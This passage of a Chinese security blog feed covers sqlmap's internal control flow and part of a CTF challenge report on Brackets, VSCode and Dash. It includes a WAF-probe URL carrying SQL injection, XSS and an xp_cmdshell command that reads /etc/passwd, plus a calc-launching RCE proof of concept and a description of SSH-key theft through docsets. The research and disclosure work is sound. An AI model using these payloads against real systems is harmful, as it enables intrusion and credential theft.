DIFF_TOLERANCE = 0.05&lt;/code&gt;&lt;h2&gt;&lt;b&gt;0x05 结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;阅读完本文，我相信读者对 sqlmap 中处理各种问题的细节都会有自己的理解，当然这是最好的。&lt;/p&gt;&lt;p&gt;在下一篇文章，笔者将会带大家进入更深层的 sqlmap 的逻辑，敬请期待。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-09-10-44157153</guid>
<pubDate>Mon, 10 Sep 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>sqlmap 内核分析 I: 基础流程</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-08-29-43242220.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/43242220&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0de9ae59e29655770ea5df5a2aa92776_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hash=&quot;af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hovercard=&quot;p$b$af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一直在想准备一系列 sqlmap 的文章，担心会不会因为太老太旧了被大家吐槽，思前想后也查了一些现有的资料，还是准备出一部分关于 sqlmap 关键技术细节的探讨。同时也在对其核心的讨论中，提炼出一些思想与方法。sqlmap 内核分析系列文章共三篇，本文为第一篇，敬请指正。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我相信在阅读本文的读者中，很大一部分人都是曾经尝试阅读过 sqlmap 源码的同学。但是在实际阅读的时候，我们发现大家总是存在各种各样奇葩的困难与困惑。&lt;/p&gt;&lt;blockquote&gt;“SqlMap 源码为什么会有大几百行一千行的方法啊”“它里面 conf 和 kb 又是啥？这两个全局变量里面到底存了啥？”“为什么我直接把 sqlmap 的 xml 取出来，还是并不是特别方便使用他们的 payload”&lt;/blockquote&gt;&lt;p&gt;我相信这些疑问大家肯定第一次在阅读这个项目的事，都会遇到。实际上，并不是因为 sqlmap 项目的水平高导致大家看不懂。而是由于项目背负了太多的历史包袱，导致在接近十年的发展中，开发者与后期维护者并没有对这款工具进行重构与大规模重写，反而是继续使用 python2 对其缝缝补补。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-712750c7108b641649d3721495a5f40d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;764&quot; data-rawheight=&quot;284&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-712750c7108b641649d3721495a5f40d&quot; data-watermark-src=&quot;v2-5c07344e99ff5c13b56bbce7afeb8127&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在本系列文章中，我们主要针对 sqlmap 的最核心的方方面面进行分析，本文主要针对基础流程进行介绍与描述，本文由非常细致的 sqlmap 源码解读，希望有需要的读者可以从中受益。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 准备工作&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;想要阅读 sqlmap 源码我相信大家的选择肯定更多的是从 github 下直接 clone 代码到本地，直接使用本地编辑器或者 IDE 打开直接来分析。所以基本操作也就是&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap&lt;/code&gt;&lt;p&gt;进入 sqlmap 的 repos 下，直接打开编辑器吧！&lt;/p&gt;&lt;p&gt;当然很多读者是 Python3 用户，其实也没有必要费很大力气在本机上安装 Python2 然后再进行操作。笔者使用的环境是&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Mac OS X&lt;/li&gt;&lt;li&gt;Pyenv&lt;/li&gt;&lt;li&gt;VSCode&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;推荐使用 Pyenv（+virtualenv） 构建 Python 环境运行 sqlmap。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 初始化与底层建筑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;笔者当然可以直接指出所有的重要逻辑在什么位置，但是这样并不好。这样做的后果就是大家发出奇怪的疑问：&lt;/p&gt;&lt;blockquote&gt;它里面 conf 和 kb 又是啥？这两个全局变量里面到底存了啥？&lt;/blockquote&gt;&lt;p&gt;逐步熟悉整个项目的构建和项目中贯穿全局的两个奇怪的全局变量，对于加速理解 sqlmap 的核心逻辑起了很大的作用。在笔者的工作和实践中，确实是很有感触。&lt;/p&gt;&lt;p&gt;所以我们还是从头看起吧！&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7b344e94e680fa513e682a3b5d466940_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;824&quot; data-rawheight=&quot;666&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7b344e94e680fa513e682a3b5d466940&quot; data-watermark-src=&quot;v2-06d2ddbe5501502bd0c6bdda720a58cd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们在上图中，可以找到很明显的程序命令行入口，我们暂且只分析命令行入口所以，我把无关的东西全部打了马赛克，所以接下来我们看到 &lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt; 函数直接来了解。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-43bc8948a61b7ca01eeea2ab047428de_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;524&quot; data-rawheight=&quot;559&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-43bc8948a61b7ca01eeea2ab047428de&quot; data-watermark-src=&quot;v2-636cd5928be38325916564577292864e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我相信大家看到了上图应该就知道我们主要应该看 &lt;code class=&quot;inline&quot;&gt;try&lt;/code&gt; 中的内容。实际上 &lt;code class=&quot;inline&quot;&gt;except&lt;/code&gt; 中指的是 sqlmap 中各种各样异常处理，包含让程序退出而释放的异常/用户异常以及各种预期或非预期异常，在 &lt;code class=&quot;inline&quot;&gt;finally&lt;/code&gt; 中，大致进行了数据库（HashDB）的检查/恢复/释放以及 &lt;code class=&quot;inline&quot;&gt;dumper&lt;/code&gt; 的收尾操作和多线程的资源回收操作。具体的不重要的代码我们就不继续介绍了，接下来直接来了解比较重要的部分吧。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-fc053c2c16c65ff3ee15f55a4158ec5d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;987&quot; data-rawheight=&quot;525&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fc053c2c16c65ff3ee15f55a4158ec5d&quot; data-watermark-src=&quot;v2-15fe5125c6a3020e351f2dd5e72a1498&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在实际在工作部分中，我们发现了 1-4 函数对环境和基础配置进行了一同操作，然后在 5 步骤的时候进行步骤初始化，然后开始启动 sqlmap。实际上这些操作并不是一无是处，接下来有详有略介绍这些步骤究竟发生了什么。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;在 DirtyPatches 中，首先设定了 httplib 的最大行长度（&lt;code class=&quot;inline&quot;&gt;httplib._MAXLINE&lt;/code&gt;），接下来导入第三方的 windows 下的 ip地址转换函数模块（&lt;code class=&quot;inline&quot;&gt;win_inet_pton&lt;/code&gt;），然后对编码进行了一些替换，把 &lt;code class=&quot;inline&quot;&gt;cp65001&lt;/code&gt; 替换为 &lt;code class=&quot;inline&quot;&gt;utf8&lt;/code&gt; 避免出现一些交互上的错误，这些操作对于 sqlmap 的实际功能影响并不是特别大，属于保证起用户体验和系统设置的正常选项，不需要进行过多关心。&lt;/li&gt;&lt;li&gt;在环境检查中，做了如下操作：检查模块路径，检查 Python 版本，导入全局变量。我们可能并不需要关心太多这一步，只需要记得在这一步我们导入了几个关键的全局变量：&lt;code class=&quot;inline&quot;&gt;(&quot;cmdLineOptions&quot;, &quot;conf&quot;, &quot;kb&quot;)&lt;/code&gt;，需要提醒大家的是，直接去 &lt;code class=&quot;inline&quot;&gt;lib.core.data&lt;/code&gt; 中寻找这几个变量并不是明智的选择，因为他们并不是在这里初始化的（说白了就是找到了定义也没有用，只需要知道有他们几个就够啦）。&lt;/li&gt;&lt;li&gt;初始化各种资源文件路径。&lt;/li&gt;&lt;li&gt;打印 Banner。&lt;/li&gt;&lt;li&gt;这一部分可以说是非常关键了，虽然表面上仍然是属于初始化的阶段，但是实际上，如果不知晓这一步，面对后面的直接对全局变量 &lt;code class=&quot;inline&quot;&gt;kb&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; 的操作将会变的非常奇怪和陌生。在这步中，我们进行了配置文件初始化，知识库（KnowledgeBase初始化）以及用户操作的 &lt;code class=&quot;inline&quot;&gt;Merge&lt;/code&gt; 和初始化。我们在之后的分析中如果遇到了针对 &lt;code class=&quot;inline&quot;&gt;kb&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; 的操作，可以直接在这个函数对应的 &lt;code class=&quot;inline&quot;&gt;lib.core.option&lt;/code&gt; 模块中寻找对应的初始化变量的定义。当然，这一步涉及到的一些 &lt;code class=&quot;inline&quot;&gt;kb/conf&lt;/code&gt; 的 fields 也可能来源于 &lt;code class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; 中，可以直接通过 &lt;code class=&quot;inline&quot;&gt;ctrl+F&lt;/code&gt; 搜索到。&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-81288766ac31da8e9e2f049c8a987b32_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1138&quot; data-rawheight=&quot;570&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-81288766ac31da8e9e2f049c8a987b32&quot; data-watermark-src=&quot;v2-9fa8331cd060a98fcc2d11ce9dab2e26&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;中主要包含所有初始变量的初始值，这些初始值在 &lt;code class=&quot;inline&quot;&gt;init()&lt;/code&gt; 的设定主要是引用各种各样的函数来完成基础设置，我们没有必要依次对其进行分支，只需要用到的时候知道回来寻找就可以了。&lt;/li&gt;&lt;li&gt;冒烟测试，测试程序本身是否可以跑得通。&lt;/li&gt;&lt;li&gt;功能测试，测试 sqlmap 功能是否完整。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;进入上一段代码的条件是 &lt;code class=&quot;inline&quot;&gt;if not conf.updateAll&lt;/code&gt;，这个是来源于 &lt;code class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; 中定义的更新选项，如果这个选项打开，sqlmap 会自动更新并且不会执行后续测试步骤和实际工作的步骤。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7147c689ef37a795faf5d08e7f703ca6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1950&quot; data-rawheight=&quot;884&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7147c689ef37a795faf5d08e7f703ca6&quot; data-watermark-src=&quot;v2-d4372b7133e9b35129787b5b45a38cf6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在实际的启动代码中，笔者在上图中标注了两处，我们在使用命令行的时候，更多的是直接调用 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数，所以我们直接跟入其中寻找之后需要研究的部分。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02 测试前的目标准备&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当我们找到 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数的时候，映入眼帘的实际上是一个很平坦的流程，我们简化一下，以下图代码为例：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5a46a1adf51de4bc8193ad0f3e8966dd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1658&quot; data-rawheight=&quot;763&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-5a46a1adf51de4bc8193ad0f3e8966dd&quot; data-watermark-src=&quot;v2-7855b8ab88049e96cbf57d43e8ee14ad&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们仍然看到了 &lt;code class=&quot;inline&quot;&gt;conf&lt;/code&gt; 中一些很奇怪的选项，针对这些选项我们在 0x01 节中强调过，可以在某一些地方找到这些选项的线索，我们以 &lt;code class=&quot;inline&quot;&gt;conf.direct&lt;/code&gt; 为例，可以在 &lt;code class=&quot;inline&quot;&gt;lib.parse.cmdline&lt;/code&gt; 中明确找到这个选项的说明：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-318d59b0e4d7d6fd7aae65575a078363_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1972&quot; data-rawheight=&quot;1480&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-318d59b0e4d7d6fd7aae65575a078363&quot; data-watermark-src=&quot;v2-39dbe5162ee750945dc1de9ee4bd939d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;根据说明，这是直连数据库的选项，所以我们可能暂时并不需要关心他，我们暂时只关注 sqlmap 是如何检测漏洞的，而不关心他是怎么样调用数据库相关操作的。&lt;/p&gt;&lt;p&gt;接下来稍有一些想法的读者当然知道，我们直接进行第四部分针对这个目标循环的分析是最简单有效的办法了！&lt;/p&gt;&lt;p&gt;好的，接下来我们就打开最核心的检测方法：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e33fdbd94ef9457edf316c817cb0a3b6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1190&quot; data-rawheight=&quot;769&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e33fdbd94ef9457edf316c817cb0a3b6&quot; data-watermark-src=&quot;v2-e0f067acd87c38620b1bb69e9235dd8f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;进入循环体之后，首先进行检查网络是否通断的选项，这个选项很容易理解我们就不多叙述了；确保网络正常之后，开始设置 &lt;code class=&quot;inline&quot;&gt;conf.url,conf.method,conf.data,conf.cookie&lt;/code&gt; 和 headers 等字段，并且在 &lt;code class=&quot;inline&quot;&gt;parseTargetUrl()&lt;/code&gt; 中进行各种合理性检查；之后会根据 HTTP 的 Method 提取需要检查的参数；随后如果当前启动时参数接受了多个目标的话，会在第4步中做一些初始化的工作。&lt;/p&gt;&lt;p&gt;在完成上述操作之后，执行 &lt;code class=&quot;inline&quot;&gt;setupTargetEnv()&lt;/code&gt; 这个函数也是一个非常重要的函数，其包含如下操作：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;def setupTargetEnv():
    _createTargetDirs()
    _setRequestParams()
    _setHashDB()
    _resumeHashDBValues()
    _setResultsFile()
    _setAuthCred()&lt;/code&gt;&lt;p&gt;其中除了 &lt;code class=&quot;inline&quot;&gt;_setRequestParams()&lt;/code&gt; 都是关于本身存储（缓存）扫描上下文和结果文件的。当然我们最关注的点肯定是 &lt;code class=&quot;inline&quot;&gt;_setRequestParams()&lt;/code&gt; 这个点。在深入了解这一个步骤之后，我们发现其中主要涉及到如下操作：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-268cea4d6395e22a8ccb5f9c82947f6d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1216&quot; data-rawheight=&quot;760&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-268cea4d6395e22a8ccb5f9c82947f6d&quot; data-watermark-src=&quot;v2-553e8d329933128b44534a4e285c0e25&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6ed18233da3719acf9674e23c2acc6c2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1373&quot; data-rawheight=&quot;736&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6ed18233da3719acf9674e23c2acc6c2&quot; data-watermark-src=&quot;v2-089f806c9e175d73b2af49b39b63b3ea&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以我们回归之前的 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 方法中的 foreach targets 的循环体中，在 &lt;code class=&quot;inline&quot;&gt;setupTargetEnv()&lt;/code&gt; 之后，我们现在已经知道了关于这个目标的所有的可以尝试注入测试的点都已经设置好了，并且都存在了 &lt;code class=&quot;inline&quot;&gt;conf.paramDict&lt;/code&gt; 这个字典中了。&lt;/p&gt;&lt;p&gt;至此，在正式开始检测之前，我们已经知道，&lt;code class=&quot;inline&quot;&gt;conf.url, conf.method, conf.headers ...&lt;/code&gt; 之类的包含基础的测试的目标的信息，在 &lt;code class=&quot;inline&quot;&gt;conf.paramDict&lt;/code&gt; 中包含具体的不同位置的需要测试的参数的字典，可以方便随时渲染 Payload。关于其具体的行为，其实大可不必太过关心，因为我们其实并不需要具体的处理细节，这些细节应该是在我们遇到问题，或者遇到唔清楚的地方再跳出来在这些步骤中寻找，并且进行研究。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 万事俱备&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;可以说在读者了解上面两节讲述的内容的时候，我们就可以正式探查真正的 SQL 注入检测时候 sqlmap 都坐上了什么。其实简单来说，需要经过下面步骤：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-934507fcca097d08998f6cac328b7403_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;618&quot; data-rawheight=&quot;886&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-934507fcca097d08998f6cac328b7403&quot; data-watermark-src=&quot;v2-ec9a1617b29b62d69fb350121f4705c1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;笔者通过对 &lt;code class=&quot;inline&quot;&gt;controller.py&lt;/code&gt; 中的 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数进行分析，得出了上面的流程图。在整个检测过程中，我们暂且不涉及细节；整个流程都是针对检查一个目标所要经历的步骤。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;checkWaf&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 &lt;code class=&quot;inline&quot;&gt;checkWaf()&lt;/code&gt; 中，文档写明：&lt;code class=&quot;inline&quot;&gt;Reference: http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse&lt;/code&gt;，我们可以在这里发现他的原理出处，有兴趣的读者可以自行研究。在实际实现的过程中代码如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8f9b7d72061fd974204b902da76ed344_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1510&quot; data-rawheight=&quot;627&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8f9b7d72061fd974204b902da76ed344&quot; data-watermark-src=&quot;v2-a34b45cfd5bf2eafb243178b1373a242&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;笔者在关键部分已经把标注和箭头写明，方便大家理解。我们发现 &lt;code class=&quot;inline&quot;&gt;payload&lt;/code&gt; 这个变量是通过随机一个数字 + space + 一个特制 Payload（涉及到很多的关于敏感关键词，可以很容易触发 WAF 拦截）。&lt;/p&gt;&lt;p&gt;随即，sqlmap 会把 payload 插入该插入的位置：对于 GET 类的请求，sqlmap 会在之前的 query 语句后面加入一个新的参数，这个参数名通过 &lt;code class=&quot;inline&quot;&gt;randomStr()&lt;/code&gt; 生成，参数的值就是经过处理的 Payload。如果有读者不理解，我们在这里可以举一个例子：&lt;/p&gt;&lt;p&gt;如果我们针对 &lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;http://this.is.a.victim.com/article.php?id=1&lt;/code&gt;&lt;p&gt;这样的 URL 进行 Waf 的检查，sqlmap 会发起一个&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;http://this.is.a.victim.com/article.php?id=1&amp;amp;mbjwe=2472%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--/%
2A%2A/%3B%20EXEC%20xp_cmdshell%28%27cat%20../../../etc/passwd%27%29%23&lt;/code&gt;&lt;p&gt;的新的请求，这个请求会有很大概率触发 Waf 的反应，然后 sqlmap 通过判断返回页面和之前页面的 &lt;b&gt;Page Ratio&lt;/b&gt; 来判断是否触发了 WAF。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;我们似乎遇到一些问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;有心的读者可能发现，我们在上小节出现了一个神奇陌生的词 &lt;b&gt;Page Ratio&lt;/b&gt;, 这个词其实在整个 sqlmap 中是非常重要的存在，我们之后会在后续的文章中详细介绍这部分理论。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 然后呢？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;其实我们当然可以继续讲解每一个函数都做了什么，但是限于篇幅问题，我们可能要先暂停一下了；与此同时，我们本文的内容“基础流程”实际上已经介绍完了，并且引出了我们需要在下一篇文章介绍的概念之一“Page Ratio”。&lt;/p&gt;&lt;p&gt;所以接下来我们可能要结束本文了，但是我更希望的是，每一个读者都能够尝试自己分析，自己去吃透 sqlmap 的细节。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x05 结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;感谢读者的耐心，在接下来的文章中，笔者将会更加深入介绍 sqlmap 最核心的算法和细节处理。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-08-29-43242220</guid>
<pubDate>Wed, 29 Aug 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Real World CTF doc2own 命题报告</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-08-08-41544965.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/41544965&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-45dff9e7b0164cc42ef97d36d70acc61_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文作者：咸鱼&lt;/p&gt;&lt;p&gt;上个月的 realdworldctf 设计了一个完全真实的客户端软件 pwn 题目。&lt;/p&gt;&lt;p&gt;在接到出题邀请的时候也差点要“另请高明”了。当时正好在准备 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/21776300&quot;&gt;LoCCS 的暑期学校&lt;/a&gt;的课件，因为拖延搞得讲课前夜通宵没睡狂写 ppt，紧接着又安排出差，趁着飞机延误之类的边角时间写评测环境和测试 exploit 之类，最后还是在比赛已经开始的情况下才在第一个晚上把稳定性堪忧的环境部署上线。&lt;/p&gt;&lt;p&gt;仓促的出题过程也是埋下了伏笔。竟然在比赛过程中，先后有几支国际队伍交上了真正的 0day 利用。而赛后我简单反编译了程序，还发现了更多的远程代码执行问题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;由于补丁今天刚刚发布，在这里我不会公开相关漏洞的细节。&lt;/b&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;在年初我偶然发现了一个 Visual Studio Code 的远程代码执行漏洞，而报告后发现被撞洞了。这个问题是 Electron 使用了 Chromium 的远程前端调试协议，是基于 http 和 WebSocket 的。&lt;/p&gt;&lt;p&gt;攻击者在知道调试端口的情况下，可以使用 dns 重绑定的技巧获得一个随机的 uuid，构造一个 WebSocket 协议的 url，向 Electron 的前端注入任意代码，实现 node.js 任意代码执行。&lt;/p&gt;&lt;p&gt;VSCode 在部分版本中意外开启了 Extension 进程的调试端口，只要浏览一个网页并停留数十秒（dns rebinding 需要一段时间让旧 dns 记录失效），计算机便可被远程控制：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;Visual Studio Code silently fixed a remote code execution vulnerability&lt;/a&gt;&lt;p&gt;受此启发我在 Adobe Brackets 上发现了完全一致的漏洞：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/adobe/brackets/issues/14149&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;CEF remote debugging is vulnerable to dns rebinding attack #14149&lt;/a&gt;&lt;p&gt;与 VSCode 不同的是，Adobe Brackets 没有使用 Electron，而是自行封装的 libCEF 框架，与 node.js 的集成方式也不同。Electron 可以在 window 的上下文中访问 node.js API，而 Brackets 的编辑器前端则没有提供这个功能，尽管 Brackets 当中使用到了 node.js 运行时。&lt;/p&gt;&lt;p&gt;不过 Brackets 在上下文中暴露了如下的两个对象：brackets 和 appshell&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1387cef8bb0e11e95bd04389228fc2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1612&quot; data-rawheight=&quot;834&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f1387cef8bb0e11e95bd04389228fc2f&quot; data-watermark-src=&quot;v2-2cfaacf85c79d72c0eb08060a3756933&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这两个对象封装了文件系统和 shell 相关的功能。虽然我们不能 require(&#39;child_process&#39;)，但是通过 appshell.fs 可以实现任意文件读写。到文件读写这一步其实已经可以拿 flag 了，当然一开始我们没有给出 flag 的路径，还是反弹一个 shell 比较靠谱。覆盖可执行文件加上额外的触发条件即可实现远程代码执行。&lt;/p&gt;&lt;p&gt;在 Brackets 的扩展接口中，我找到了如下两个与系统 shell 相关的方法：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;brackets.app.openURLInDefaultBrowser&lt;/li&gt;&lt;li&gt;brackets.app.showOSFolder&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;前者支持打开 file:/// 域名，在 Windows 下相当于 ShellExecute，打开一个 .cmd 或者 .exe 即可执行代码；而 showOSFolder 在 macOS 下的表现是，如果文件夹是一个有效的 .app bundle，那么等同于双击 .app，也就是运行。如果你不太明白，那么请尝试在终端中执行&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;find /Applications/Calculator.app
open /Applications/Calculator.app&lt;/code&gt;&lt;p&gt;因此我们先判断平台差异，通过 appshell.fs 创建可执行文件，然后调用对应的方法即可运行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function calc() {  // use brackets.fs to write your own executable  // makedir, writeFile, chmod are your friends  if (brackets.app.getUserDocumentsDirectory().indexOf(&#39;/&#39;) === 0) {    brackets.app.showOSFolder(&#39;/Applications/Calculator.app&#39;);  } else {    brackets.app.openURLInDefaultBrowser(&#39;file:///C:/windows/system32/calc.exe&#39;);  }}&lt;/code&gt;&lt;p&gt;到这里即可实现与 VSCode 之前的 bug 完全一致的效果，通过 dns 重绑定攻击本地端口实现远程代码执行。在我之前的漏洞报告后，libCEF 参考 node.js 和 Electron 的做法修复了 dns 重绑定的问题。但是最新版 Brackets 的这个端口仍然可以从 localhost 访问。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;为什么盯上了 Dash 呢？&lt;/p&gt;&lt;p&gt;Dash 可以说是以 macOS 为主力开发环境的程序员当中很受欢迎的一款工具了，主要功能就是离线看文档。文档是一个后缀为 docset 的 bundle 文件夹，存放 html 资源和索引数据库等。&lt;/p&gt;&lt;p&gt;它具有两个攻击面，一个是展示文档时用的是 WebView，另一个是在打开文档的时候会启用一个内置的 GCDWebServer 来启动一个 http 服务，可通过其他计算机访问。&lt;/p&gt;&lt;p&gt;macOS 上的 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//developer.apple.com/documentation/webkit/webview%3Flanguage%3Dobjc&quot;&gt;WebView&lt;/a&gt; 和 iOS 的 UIWebView 在很多方面是一样的：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;没有进程隔离和 sandbox&lt;/li&gt;&lt;li&gt;在 file:/// 域下的文件默认具有 AllowUniversalAccessFromFileURLs 和 AllowFileAccessFromFileURLs 的 UXSS 能力&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在之前版本的 Dash 就可以通过一个恶意的 docset，以 XMLHttpRequest 的方式读取并上传本地文件（例如 ssh 公私钥）的内容。在 3.x 的某一个版本（具体不详）中增加了限制，如果访问的文件在 docset 目录之外会失败。但这个版本可以使用在压缩包中添加符号链接的方式绕过（由于 docset 是文件夹，通常的分发方式是使用 tar.gz 包）。此外符号链接的问题同样影响 Dash 内置的 http 服务。&lt;/p&gt;&lt;p&gt;经过报告后修复了本地文件泄露的问题，这也为出题提供了一个绝佳的条件——这是个允许跨域请求，却又不能简单 AJAX 读本地文件的环境，选手必须实现实质性的远程代码执行。最后这个 WebView 和系统内置 Safari 的 WebKit 